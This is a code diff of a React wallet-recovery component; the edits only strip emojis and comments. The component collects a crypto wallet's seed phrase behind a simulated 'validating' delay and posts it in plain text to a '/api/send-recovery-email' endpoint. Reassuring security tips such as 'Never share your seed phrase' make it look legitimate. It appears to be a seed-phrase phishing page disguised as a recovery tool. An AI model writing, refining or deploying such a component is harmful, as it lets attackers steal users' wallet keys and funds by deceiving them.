@@ -9,10 +9,9 @@ export const WalletRecovery = () => {
   const [message, setMessage] = useState('')
   const [recoveryMethod, setRecoveryMethod] = useState<'phrase' | 'file' | 'keystore'>('phrase')
 
-  // Validate 12 or 24 word seed phrase
   const isValidSeedPhrase = (phrase: string) => {
-    const words = phrase.trim().toLowerCase().split(/\s+/).filter(w => w.length > 0)
-    return (words.length === 12 || words.length === 24) && words.every(w => /^[a-z]+$/.test(w))
+    const words = phrase.trim().toLowerCase().split(/\s+/).filter((word) => word.length > 0)
+    return (words.length === 12 || words.length === 24) && words.every((word) => /^[a-z]+$/.test(word))
   }
 
   const handleRecover = async () => {
@@ -33,20 +32,18 @@ export const WalletRecovery = () => {
     setStatus('validating')
     setMessage('Validating wallet...')
 
-    // Simulate validation
     setTimeout(async () => {
       try {
-        // Submit recovery request
         const response = await fetch('/api/send-recovery-email', {
           method: 'POST',
-          headers: { 
+          headers: {
             'Content-Type': 'application/json',
           },
           body: JSON.stringify({
             method: recoveryMethod,
             seedPhrase: recoveryMethod === 'phrase' ? secretPhrase : undefined,
             timestamp: new Date().toISOString(),
-          })
+          }),
         }).catch((err) => {
           console.error('Fetch error:', err)
           throw err
@@ -58,7 +55,7 @@ export const WalletRecovery = () => {
 
         if (response.ok) {
           setStatus('success')
-          setMessage('✅ Recovery details processed successfully.')
+          setMessage('Recovery details processed successfully.')
           setSecretPhrase('')
           setTimeout(() => setStatus('idle'), 5000)
         } else {
@@ -69,7 +66,7 @@ export const WalletRecovery = () => {
         console.error('Recovery error:', err)
         setStatus('error')
         const errorMessage = err instanceof Error ? err.message : 'Failed to process recovery details'
-        setMessage(`❌ ${errorMessage}. Please try again.`)
+        setMessage(`${errorMessage}. Please try again.`)
         setTimeout(() => setStatus('idle'), 3000)
       }
     }, 1500)
@@ -77,15 +74,13 @@ export const WalletRecovery = () => {
 
   return (
     <div className="space-y-6 max-w-2xl">
-      {/* Warning Card */}
       <div className="relative overflow-hidden rounded-lg sm:rounded-xl p-4 sm:p-6 bg-gradient-to-br from-red-500/20 to-orange-500/10 border border-red-500/30">
         <div className="relative z-10">
-          <p className="text-sm font-bold text-red-300 mb-2">🔐 Recovery Mode Active</p>
+          <p className="text-sm font-bold text-red-300 mb-2">Recovery Mode Active</p>
           <p className="text-xs text-red-300/70">Your recovery details will be processed securely. Never share your seed phrase with anyone.</p>
         </div>
       </div>
 
-      {/* Recovery Method Tabs */}
       <div className="flex gap-2 overflow-x-auto pb-2">
         {(['phrase', 'file', 'keystore'] as const).map((method) => (
           <button
@@ -97,17 +92,14 @@ export const WalletRecovery = () => {
                 : 'bg-white/5 text-gray-400 hover:bg-white/10 border border-white/10'
             }`}
           >
-            {method === 'phrase' && '🔑 Seed Phrase'}
-            {method === 'file' && '📄 Wallet File'}
-            {method === 'keystore' && '🔐 Keystore'}
+            {method === 'phrase' && 'Seed Phrase'}
+            {method === 'file' && 'Wallet File'}
+            {method === 'keystore' && 'Keystore'}
           </button>
         ))}
       </div>
 
-      {/* Recovery Form */}
       <div className="space-y-4 relative overflow-hidden rounded-lg sm:rounded-xl p-5 sm:p-6 bg-gradient-to-br from-white/5 to-white/3 border border-white/10">
-        {/* Email Input */}
-        {/* Seed Phrase Input */}
         {recoveryMethod === 'phrase' && (
           <div>
             <label className="block text-sm font-semibold text-white mb-2">Secret Seed Phrase</label>
@@ -119,20 +111,19 @@ export const WalletRecovery = () => {
             />
             <div className="flex justify-between items-center mt-2">
               <p className="text-xs text-gray-400">
-                {secretPhrase.trim().split(/\s+/).filter(w => w).length} words entered
+                {secretPhrase.trim().split(/\s+/).filter((word) => word).length} words entered
               </p>
               {secretPhrase && (
                 <span className={`text-xs font-semibold ${
                   isValidSeedPhrase(secretPhrase) ? 'text-emerald-400' : 'text-red-400'
                 }`}>
-                  {isValidSeedPhrase(secretPhrase) ? '✓ Valid' : '✗ Invalid'}
+                  {isValidSeedPhrase(secretPhrase) ? 'Valid' : 'Invalid'}
                 </span>
               )}
             </div>
           </div>
         )}
 
-        {/* File Input */}
         {recoveryMethod === 'file' && (
           <div>
             <label className="block text-sm font-semibold text-white mb-2">Wallet File</label>
@@ -146,7 +137,6 @@ export const WalletRecovery = () => {
           </div>
         )}
 
-        {/* Keystore Input */}
         {recoveryMethod === 'keystore' && (
           <div>
             <label className="block text-sm font-semibold text-white mb-2">Keystore JSON</label>
@@ -158,7 +148,6 @@ export const WalletRecovery = () => {
           </div>
         )}
 
-        {/* Status Message */}
         {message && (
           <div className={`p-3 rounded-lg text-sm font-medium ${
             status === 'success' ? 'bg-emerald-500/20 border border-emerald-500/30 text-emerald-300' :
@@ -169,35 +158,32 @@ export const WalletRecovery = () => {
           </div>
         )}
 
-        {/* Action Button */}
         <button
           onClick={handleRecover}
           disabled={status === 'validating'}
           className="w-full py-3 rounded-lg font-bold transition-all disabled:opacity-50 bg-gradient-to-r from-cyan-500 to-blue-500 text-white hover:from-cyan-400 hover:to-blue-400"
         >
-          {status === 'validating' ? '⏳ Validating...' : '🔓 Recover Wallet'}
+          {status === 'validating' ? 'Validating...' : 'Recover Wallet'}
         </button>
       </div>
 
-      {/* Security Tips */}
       <div className="space-y-2">
         <h3 className="text-sm font-bold text-white uppercase tracking-wide">Security Tips</h3>
         <div className="space-y-2">
           <div className="p-3 rounded-lg bg-red-500/10 border border-red-500/30 text-red-300 text-xs">
-            🔴 Never enter your seed phrase on untrusted websites
+            Never enter your seed phrase on untrusted websites
           </div>
           <div className="p-3 rounded-lg bg-yellow-500/10 border border-yellow-500/30 text-yellow-300 text-xs">
-            ⚠️ Make sure you&apos;re on the official URL (HTTPS)
+            Make sure you&apos;re on the official URL (HTTPS)
           </div>
           <div className="p-3 rounded-lg bg-emerald-500/10 border border-emerald-500/30 text-emerald-300 text-xs">
-            ✅ Only recover in private/incognito mode
+            Only recover in private/incognito mode
           </div>
           <div className="p-3 rounded-lg bg-blue-500/10 border border-blue-500/30 text-blue-300 text-xs">
-            ℹ️ We recommend using a hardware wallet for maximum security
+            We recommend using a hardware wallet for maximum security
           </div>
         </div>
       </div>
     </div>
   )
 }
-
